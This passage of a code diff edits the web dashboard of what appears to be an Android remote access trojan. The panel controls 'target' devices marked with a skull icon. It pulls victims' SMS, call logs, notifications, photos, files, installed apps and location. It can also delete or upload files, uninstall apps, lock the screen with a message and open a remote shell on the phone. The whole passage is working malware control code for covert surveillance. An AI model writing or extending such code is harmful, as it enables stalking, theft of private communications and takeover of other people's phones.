+            body.innerHTML = '<table><thead><tr><th>App</th><th>Title</th><th>Text</th></tr></thead><tbody>' + (clientData.notifications || []).map(n => `<tr><td>${n.packageName}</td><td>${n.title}</td><td>${n.text}</td></tr>`).join('') + '</tbody></table>';
+            break;
+        case 'apps':
+            body.innerHTML = '<table><thead><tr><th>App Name</th><th>Package Name</th><th>Actions</th></tr></thead><tbody>' + (clientData.apps || []).map(app => `<tr><td>${app.appName}</td><td>${app.packageName}</td><td><button class="action-btn" onclick="sendCommand('run ${app.packageName}')">Run</button><button class="action-btn" onclick="uninstallApp('${app.packageName}')">Uninstall</button></td></tr>`).join('') + '</tbody></table>';
+            break;
+    }
+}
+
+// Actions
+function sendToast() { const text = document.getElementById('toast-text').value; if (text) sendCommand(`toast on ${text}`); }
+function handleFmAction(action, fileName) {
+    if (action === 'rename') {
+        const selectedFile = prompt('Which file to rename?');
+        if (selectedFile && document.getElementById('fm-input').value) sendCommand(`rename ${selectedFile} ${document.getElementById('fm-input').value}`);
+    } else if (action === 'delete' && confirm(`Delete ${fileName}?`)) {
+        sendCommand(`del ${fileName}`);
+    }
+}
+function uninstallApp(pkg) { if(confirm(`Request uninstall for ${pkg}?`)) sendCommand(`uninstall ${pkg}`); }
+function toggleFlash() {
+    flashOn = !flashOn;
+    sendCommand(flashOn ? 'flashon' : 'flashoff');
+    const btn = document.getElementById('flash-btn');
+    if (btn) {
+      btn.innerHTML = `<i class="fas fa-bolt"></i>Flash ${flashOn ? 'ON' : 'OFF'}`;
+      btn.style.color = flashOn ? 'yellow' : 'var(--border-color)';
+    }
+}
+function showPopup(type, message) {
+    const popup = document.getElementById('popup-overlay');
+    document.getElementById('popup-content').innerHTML = message;
+    popup.style.display = 'block';
+    if (popupTimeout) clearTimeout(popupTimeout);
+    popupTimeout = setTimeout(() => { popup.style.display = 'none'; }, 8000);
+}
+
+// Main Polling Loop
+async function pollStatus() {
+    try {
+        const response = await fetch('/api/status');
+        state = await response.json();
+        updateDeviceList();
+
+        // Fetch data for all connected clients and handle popups
+        for (const device of state.devices) {
+            const clientDataResponse = await fetch(`/api/client_data/${device.id}`);
+            const clientData = await clientDataResponse.json();
+            clientDataCache[device.id] = clientData;
+
+            if (device.id === selectedClientId) {
+                // Location URL popup
+                if (clientData.location_url) {
+                    showPopup('location', `Location: <a href="${clientData.location_url}" target="_blank">Open Map</a>`);
                 }
-            }
-            
-            updateMainDashboard();
-        }
-
-        // Update Main Dashboard
-        function updateMainDashboard() {
-            const devInfo = document.getElementById('device-info');
-            const connStatus = document.getElementById('connection-status');
-            const mainGridPanel = document.getElementById('main-grid-panel');
-            
-            if (selectedClientId && state.devices.some(d => d.id === selectedClientId)) {
-                const device = state.devices.find(d => d.id === selectedClientId);
-                devInfo.innerHTML = `<i class="fas fa-skull"></i> ${device.id.split(':')[0]}`;
-                connStatus.innerHTML = '<i class="fas fa-circle"></i> ONLINE';
-                connStatus.className = 'connection-status status-online';
-                mainGridPanel.innerHTML = getGridButtonsHtml(true);
-                
-                // Update flash button state
-                if (flashState[selectedClientId]) {
-                    const flashBtn = document.getElementById('flash-btn');
-                    if (flashBtn) {
-                        flashBtn.innerHTML = '<i class="fas fa-bolt"></i>Flash ON';
-                        flashBtn.style.color = 'var(--accent-purple)';
+                // Notification popup
+                if (clientData.notifications && clientData.notifications.length > 0) {
+                    const latestNotif = clientData.notifications[0];
+                    const notifHash = `${device.id}-${latestNotif.title}-${latestNotif.text}`;
+                    if (!notificationHashes.has(notifHash)) {
+                        showPopup('notification', `<strong>${latestNotif.title}</strong><br>${latestNotif.text}`);
+                        notificationHashes.add(notifHash);
                     }
                 }
-            } else {
-                devInfo.innerHTML = '<i class="fas fa-question"></i> NONE SELECTED';
-                connStatus.innerHTML = '<i class="fas fa-circle"></i> OFFLINE';
-                connStatus.className = 'connection-status status-offline';
-                mainGridPanel.innerHTML = getGridButtonsHtml(false);
             }
         }
 
-        // Get Grid Buttons HTML
-        function getGridButtonsHtml(enabled) {
-            const disabledAttr = enabled ? '' : 'disabled';
-            const flashText = (selectedClientId && flashState[selectedClientId]) ? 'Flash ON' : 'Flash OFF';
-            
-            return `
-                <button class="grid-btn" ${disabledAttr} onclick="openModal('sms')">
-                    <i class="fas fa-sms"></i>SMS
-                </button>
-                <button class="grid-btn" ${disabledAttr} onclick="openModal('calls')">
-                    <i class="fas fa-phone-alt"></i>Call Logs
-                </button>
-                <button class="grid-btn" ${disabledAttr} onclick="openModal('filemanager')">
-                    <i class="fas fa-folder-open"></i>File Manager
-                </button>
-                <button class="grid-btn" ${disabledAttr} onclick="openModal('gallery')">
-                    <i class="fas fa-images"></i>Gallery
-                </button>
-                <button class="grid-btn" ${disabledAttr} onclick="openModal('notifications')">
-                    <i class="fas fa-bell"></i>Notifications
-                </button>
-                <button class="grid-btn" ${disabledAttr} onclick="openModal('apps')">
-                    <i class="fas fa-th-large"></i>Apps
-                </button>
-                <button class="grid-btn" ${disabledAttr} onclick="openModal('toast')">
-                    <i class="fas fa-lock"></i>Screen Lock
-                </button>
-                <button class="grid-btn" id="flash-btn" ${disabledAttr} onclick="toggleFlash()">
-                    <i class="fas fa-bolt"></i>${flashText}
-                </button>
-                <button class="grid-btn" ${disabledAttr} onclick="sendCommand('get_location')">
-                    <i class="fas fa-map-marker-alt"></i>Location
-                </button>
-                <button class="grid-btn" ${disabledAttr} onclick="openModal('terminal')">
-                    <i class="fas fa-terminal"></i>Terminal
-                </button>
-            `;
-        }
-
-        // Modal Functions
-        function openModal(modalType) {
-            if (!selectedClientId) { 
-                showPopup('error', 'Select a target device first.'); 
-                return; 
-            }
-            
-            currentModal = modalType;
-            document.getElementById('main-modal').style.display = 'block';
-            
-            let title = modalType.charAt(0).toUpperCase() + modalType.slice(1);
-            if (modalType === 'filemanager') title = 'File Manager';
-            else if (modalType === 'toast') title = 'Screen Lock';
-            
-            document.getElementById('modal-title').innerHTML = `<i class="fas fa-${getIconForModal(modalType)}"></i> ${title}`;
-            
+        if (currentModal && selectedClientId) {
             renderModalContent();
-            fetchInitialDataForModal(modalType);
         }
 
-        function getIconForModal(modalType) {
-            const icons = {
-                sms: 'sms',
-                calls: 'phone',
-                filemanager: 'folder',
-                gallery: 'images',
-                notifications: 'bell',
-                apps: 'th-large',
-                toast: 'lock',
-                terminal: 'terminal'
-            };
-            return icons[modalType] || 'terminal';
-        }
+    } catch (e) {
+        console.error('Polling error:', e);
+        document.getElementById('connection-status').textContent = 'ERROR';
+        document.getElementById('connection-status').style.color = 'red';
+    }
+    setTimeout(pollStatus, 2500);
+}
 
-        function closeModal() {
-            if (currentModal === 'notifications') {
-                sendCommand('exit');
-            }
-            if (currentModal === 'filemanager' || currentModal === 'terminal') {
-                if (terminalModes[selectedClientId]) {
-                    sendCommand('exit');
-                    delete terminalModes[selectedClientId];
-                }
-            }
-            
-            document.getElementById('main-modal').style.display = 'none';
-            currentModal = null;
-        }
-
-        function fetchInitialDataForModal(modalType) {
-            const commands = { 
-                sms: 'getsms', 
-                calls: 'getcalllogs', 
-                filemanager: 'filemanager', 
-                gallery: 'gallery', 
-                apps: 'list_app', 
-                notifications: 'notifikasi' 
-            };
-            
-            if (commands[modalType]) {
-                sendCommand(commands[modalType]);
-            }
-        }
-
-        async function renderModalContent() {
-            const body = document.getElementById('modal-body');
-            const footer = document.getElementById('modal-footer');
-            
-            body.innerHTML = '<div style="text-align: center; padding: 50px;"><i class="fas fa-spinner fa-spin fa-3x"></i><br>Loading...</div>';
-            footer.innerHTML = '';
-
-            if (!selectedClientId) { 
-                body.innerHTML = 'No client selected.'; 
-                return; 
-            }
-            
-            try {
-                const response = await fetch(`/api/client_data/${selectedClientId}`);
-                const clientData = await response.json();
-                
-                if (clientData.error) { 
-                    body.innerHTML = 'Error fetching client data.'; 
-                    return; 
-                }
-
-                switch(currentModal) {
-                    case 'sms':
-                        renderSmsModal(body, clientData);
-                        break;
-                    case 'calls':
-                        renderCallsModal(body, clientData);
-                        break;
-                    case 'filemanager':
-                        renderFileManagerModal(body, footer, clientData);
-                        break;
-                    case 'gallery':
-                        renderGalleryModal(body, footer, clientData);
-                        break;
-                    case 'notifications':
-                        renderNotificationsModal(body, footer, clientData);
-                        break;
-                    case 'apps':
-                        renderAppsModal(body, footer, clientData);
-                        break;
-                    case 'toast':
-                        renderToastModal(body, footer);
-                        break;
-                    case 'terminal':
-                        renderTerminalModal(body, footer, clientData);
-                        break;
-                }
-            } catch (e) {
-                body.innerHTML = 'Error loading data: ' + e.message;
-            }
-        }
-
-        // Modal Renderers
-        function renderSmsModal(body, clientData) {
-            if (!clientData.sms_logs || clientData.sms_logs.length === 0) {
-                body.innerHTML = '<div style="text-align: center; padding: 50px;"><i class="fas fa-inbox"></i><br>No SMS messages found.</div>';
-                return;
-            }
-            
-            body.innerHTML = '<table><thead><tr><th>Sender</th><th>Message</th></tr></thead><tbody>' +
-                clientData.sms_logs.map(log => `<tr>
-                    <td><i class="fas fa-user"></i> ${log.userSender || 'Unknown'}</td>
-                    <td>${log.content || ''}</td>
-                </tr>`).join('') + '</tbody></table>';
-        }
-
-        function renderCallsModal(body, clientData) {
-            if (!clientData.call_logs || clientData.call_logs.length === 0) {
-                body.innerHTML = '<div style="text-align: center; padding: 50px;"><i class="fas fa-phone-slash"></i><br>No call logs found.</div>';
-                return;
-            }
-            
-            body.innerHTML = '<table><thead><tr><th>Number</th><th>Date</th><th>Duration</th><th>Type</th></tr></thead><tbody>' +
-                clientData.call_logs.map(log => `<tr>
-                    <td>${log.number || 'Unknown'}</td>
-                    <td>${log.date || 'N/A'}</td>
-                    <td>${log.duration_seconds || 0}s</td>
-                    <td><span style="color: ${log.call_type === 'MISSED' ? 'var(--accent-red)' : 'var(--accent-green)'}">${log.call_type || 'Unknown'}</span></td>
-                </tr>`).join('') + '</tbody></table>';
-        }
-
-        function renderFileManagerModal(body, footer, clientData) {
-            const fmData = clientData.file_manager || { path: '/', files: [] };
-            
-            footer.innerHTML = `
-                <input type="text" id="fm-input" placeholder="Filename for rename..." style="flex: 1;">
-                <button onclick="handleFmAction('rename')"><i class="fas fa-pen"></i> Rename</button>
-                <button onclick="document.getElementById('file-upload-input').click()"><i class="fas fa-upload"></i> Upload</button>
-            `;
-            
-            let filesHtml = `<div class="current-path"><i class="fas fa-folder-open"></i> ${fmData.path || '/'}</div>`;
-            filesHtml += '<table><thead><tr><th>Name</th><th>Type</th><th>Actions</th></tr></thead><tbody>';
-            
-            // Parent directory link
-            if (fmData.path !== '/') {
-                filesHtml += `<tr>
-                    <td colspan="3">
-                        <a href="#" class="folder-link" onclick="sendCommand('cd ..')">
-                            <i class="fas fa-level-up-alt"></i> .. (Parent Directory)
-                        </a>
-                    </td>
-                </tr>`;
-            }
-            
-            // Files and folders
-            if (fmData.files && fmData.files.length > 0) {
-                fmData.files.forEach(file => {
-                    if (file.isDirectory) {
-                        filesHtml += `<tr>
-                            <td>
-                                <a href="#" class="folder-link" onclick="sendCommand('cd ${file.name}')">
-                                    <i class="fas fa-folder"></i> ${file.name}
-                                </a>
-                            </td>
-                            <td>Folder</td>
-                            <td></td>
-                        </tr>`;
-                    } else {
-                        filesHtml += `<tr>
-                            <td><i class="fas fa-file"></i> ${file.name}</td>
-                            <td>File</td>
-                            <td>
-                                <button class="action-btn" onclick="sendCommand('get ${file.name}')">
-                                    <i class="fas fa-download"></i>
-                                </button>
-                                <button class="action-btn delete" onclick="handleFmAction('delete', '${file.name}')">
-                                    <i class="fas fa-trash"></i>
-                                </button>
-                            </td>
-                        </tr>`;
-                    }
-                });
-            }
-            
-            filesHtml += '</tbody></table>';
-            body.innerHTML = filesHtml;
-            
-            // Handle file upload
-            document.getElementById('file-upload-input').onchange = (e) => {
-                if (e.target.files.length) {
-                    uploadFile(e.target.files[0], fmData.path);
-                }
-            };
-        }
-
-        function renderGalleryModal(body, footer, clientData) {
-            const gallery = clientData.gallery || { page: 0, files: [] };
-            
-            footer.innerHTML = `
-                <button onclick="sendCommand('gallery back')"><i class="fas fa-arrow-left"></i> Previous</button>
-                <span style="color: var(--accent-green);">Page: ${gallery.page || 0}</span>
-                <button onclick="sendCommand('gallery next')">Next <i class="fas fa-arrow-right"></i></button>
-            `;
-            
-            if (!gallery.files || gallery.files.length === 0) {
-                body.innerHTML = '<div style="text-align: center; padding: 50px;"><i class="fas fa-images"></i><br>No images found.</div>';
-                return;
-            }
-            
-            body.innerHTML = '<div id="gallery-grid">' + 
-                gallery.files.map(file => `
-                    <div class="gallery-item" onclick="viewImage('${file.name}')">
-                        <img src="/gallery_images/${file.name}" alt="${file.name}">
-                        <p>${file.name}</p>
-                    </div>
-                `).join('') + '</div>';
-        }
-
-        function renderNotificationsModal(body, footer, clientData) {
-            if (!clientData.notifications || clientData.notifications.length === 0) {
-                body.innerHTML = '<div style="text-align: center; padding: 50px;"><i class="fas fa-bell-slash"></i><br>No notifications found.</div>';
-                return;
-            }
-            
-            body.innerHTML = '<table><thead><tr><th>App</th><th>Title</th><th>Message</th></tr></thead><tbody>' +
-                clientData.notifications.map(n => `<tr>
-                    <td>${n.packageName || 'Unknown'}</td>
-                    <td><strong>${n.title || ''}</strong></td>
-                    <td>${n.text || ''}</td>
-                </tr>`).join('') + '</tbody></table>';
-            
-            footer.innerHTML = '<button onclick="closeModal()"><i class="fas fa-stop"></i> Stop Listening</button>';
-        }
-
-        function renderAppsModal(body, footer, clientData) {
-            if (!clientData.apps || clientData.apps.length === 0) {
-                body.innerHTML = '<div style="text-align: center; padding: 50px;"><i class="fas fa-times"></i><br>No apps found.</div>';
-                return;
-            }
-            
-            body.innerHTML = '<table><thead><tr><th>App Name</th><th>Package Name</th><th>Actions</th></tr></thead><tbody>' +
-                clientData.apps.map(app => `<tr>
-                    <td>${app.appName || 'Unknown'}</td>
-                    <td style="font-size: 0.8rem; color: var(--text-secondary);">${app.packageName || ''}</td>
-                    <td>
-                        <button class="action-btn" onclick="sendCommand('run ${app.packageName}')">
-                            <i class="fas fa-play"></i>
-                        </button>
-                        <button class="action-btn delete" onclick="uninstallApp('${app.packageName}')">
-                            <i class="fas fa-trash"></i>
-                        </button>
-                    </td>
-                </tr>`).join('') + '</tbody></table>';
-            
-            footer.innerHTML = `
-                <input type="text" id="app-command" placeholder="Enter command..." style="flex: 1;">
-                <button onclick="executeAppCommand()"><i class="fas fa-terminal"></i> Execute</button>
-            `;
-        }
-
-        function renderToastModal(body, footer) {
-            body.innerHTML = `
-                <div style="padding: 20px; text-align: center;">
-                    <i class="fas fa-lock fa-3x" style="color: var(--accent-purple);"></i>
-                    <p style="margin-top: 20px;">Enter text to display on the locked screen.</p>
-                </div>
-            `;
-            
-            footer.innerHTML = `
-                <input type="text" id="toast-text" placeholder="Your message here..." style="flex: 1;">
-                <button onclick="sendToast()"><i class="fas fa-lock"></i> Lock Screen</button>
-                <button onclick="sendCommand('toast off')"><i class="fas fa-unlock"></i> Unlock</button>
-            `;
-        }
-
-        function renderTerminalModal(body, footer, clientData) {
-            body.innerHTML = `
-                <div style="background: #000; padding: 20px; font-family: 'Courier New', monospace; height: 100%; overflow-y: auto;">
-                    <div class="terminal-line">ANONYMOUS SHELL v2.0 - Terminal Mode</div>
-                    <div class="terminal-line">Type 'help' for available commands</div>
-                    <div class="terminal-line">----------------------------------------</div>
-                    <div id="terminal-output" style="margin-top: 20px;"></div>
-                    <div style="display: flex; margin-top: 20px;">
-                        <span class="terminal-prompt" style="color: var(--accent-green);"></span>
-                        <input type="text" id="terminal-input" style="flex: 1; background: none; border: none; color: var(--accent-green); outline: none; font-family: 'Courier New', monospace;" placeholder="Type command...">
-                    </div>
-                </div>
-            `;
-            
-            footer.innerHTML = '';
-            
-            // Terminal input handler
-            const terminalInput = document.getElementById('terminal-input');
-            terminalInput.addEventListener('keypress', (e) => {
-                if (e.key === 'Enter') {
-                    const cmd = terminalInput.value;
-                    if (cmd) {
-                        const output = document.getElementById('terminal-output');
-                        output.innerHTML += `<div class="terminal-line"><span style="color: var(--accent-purple);">$</span> ${cmd}</div>`;
-                        sendCommand(cmd);
-                        terminalInput.value = '';
-                    }
-                }
-            });
-            
-            sendCommand('shell');
-        }
-
-        // Action Handlers
-        function handleFmAction(action, fileName) {
-            const input = document.getElementById('fm-input');
-            
-            if (action === 'rename') {
-                const selectedFile = prompt('Enter filename to rename:');
-                if (selectedFile && input.value) {
-                    sendCommand(`rename ${selectedFile} ${input.value}`);
-                }
-            } else if (action === 'delete' && fileName) {
-                if (confirm(`Are you sure you want to delete ${fileName}?`)) {
-                    sendCommand(`del ${fileName}`);
-                }
-            }
-        }
-
-        function uninstallApp(pkg) {
-            if (confirm(`Are you sure you want to uninstall ${pkg}?`)) {
-                sendCommand(`uninstall ${pkg}`);
-            }
-        }
-
-        function executeAppCommand() {
-            const cmd = document.getElementById('app-command').value;
-            if (cmd) {
-                sendCommand(cmd);
-                document.getElementById('app-command').value = '';
-            }
-        }
-
-        function sendToast() {
-            const text = document.getElementById('toast-text').value;
-            if (text) {
-                sendCommand(`toast on ${text}`);
-            }
-        }
-
-        function toggleFlash() {
-            if (!selectedClientId) return;
-            
-            flashState[selectedClientId] = !flashState[selectedClientId];
-            sendCommand(flashState[selectedClientId] ? 'flashon' : 'flashoff');
-            
-            const flashBtn = document.getElementById('flash-btn');
-            if (flashBtn) {
-                flashBtn.innerHTML = `<i class="fas fa-bolt"></i>Flash ${flashState[selectedClientId] ? 'ON' : 'OFF'}`;
-                flashBtn.style.color = flashState[selectedClientId] ? 'var(--accent-purple)' : 'var(--text-primary)';
-            }
-        }
-
-        function viewImage(filename) {
-            window.open(`/gallery_images/${filename}`, '_blank');
-        }
-
-        function uploadFile(file, currentPath) {
-            const reader = new FileReader();
-            reader.onload = (e) => {
-                const base64Data = e.target.result.split(',')[1];
-                sendCommand('upload', { 
-                    filename: file.name, 
-                    data: base64Data,
-                    path: currentPath 
-                });
-                showPopup('info', `Uploading ${file.name}...`);
-            };
-            reader.readAsDataURL(file);
-        }
-
-        function showPopup(type, message) {
-            const popup = document.getElementById('popup-overlay');
-            document.getElementById('popup-content').innerHTML = message;
-            popup.style.display = 'block';
-            
-            if (popupTimeout) clearTimeout(popupTimeout);
-            popupTimeout = setTimeout(() => { 
-                popup.style.display = 'none'; 
-            }, 5000);
-        }
-
-        // Polling Loop
-        async function pollStatus() {
-            try {
-                const response = await fetch('/api/status');
-                const data = await response.json();
-                state = data;
-                
-                updateDeviceList();
-                
-                // Check for new notifications
-                if (selectedClientId && currentModal) {
-                    renderModalContent();
-                }
-                
-            } catch (e) {
-                console.error('Polling error:', e);
-                document.getElementById('connection-status').innerHTML = '<i class="fas fa-circle"></i> ERROR';
-                document.getElementById('connection-status').className = 'connection-status status-offline';
-            }
-            
-            setTimeout(pollStatus, 2000);
-        }
-
-        // Initialize
-        window.onload = function() {
-            updateMainDashboard();
-            pollStatus();
-        };
-
-        // Close modal when clicking outside
-        window.onclick = function(event) {
-            const modal = document.getElementById('main-modal');
-            if (event.target == modal) {
-                closeModal();
-            }
-        };
-
-        // Handle mobile back button
-        window.addEventListener('popstate', function() {
-            if (currentModal) {
-                closeModal();
-            }
-        });
-    </script>
+window.onload = () => {
+    updateMainDashboard();
+    pollStatus();
+};
+window.onclick = (event) => { if (event.target == document.getElementById('main-modal')) closeModal(); };
+</script>
 </body>
 </html>
